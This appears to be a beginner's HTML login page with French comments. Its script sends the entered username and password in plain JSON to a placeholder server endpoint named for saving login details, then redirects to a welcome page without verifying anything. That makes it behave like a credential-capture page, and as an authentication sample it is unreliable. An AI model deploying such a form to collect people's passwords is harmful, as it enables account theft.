<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <img src="image/globe.png" alt="Globe Logo" style="width: 500px;">
    </header>
    <main>
        <input type="text" id="username" placeholder="Phone, Mail or Username">
        <br>
        <input type="password" id="password" placeholder="Password">
        <br>
        <button style="background-color: blue;" onclick="login()">Login</button>
        <br>
        <a href="acceuil.html" style="color: rgb(72, 112, 165);">Forgot password?</a>
        <br><br>
        <a href="help.html" style="color: green;">Need help logging in?</a>
    </main>
    <br><br>
    <footer>
        <img src="image/globe.png" alt="Globe Logo" style="width: 500px;">
    </footer>

    <script>
        function login() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Ici, vous enverrez ces informations à votre serveur pour les stocker en toute sécurité dans la base de données
    // Utilisez Ajax ou Fetch pour envoyer ces données au serveur

    // Exemple de requête Ajax
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://votreserveur.com/enregistrer_infos_connexion", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({ username: username, password: password }));

    // Redirection vers la page de bienvenue après connexion
    window.location.href = "welcome.html";
}
    </script>
</body>
</html>
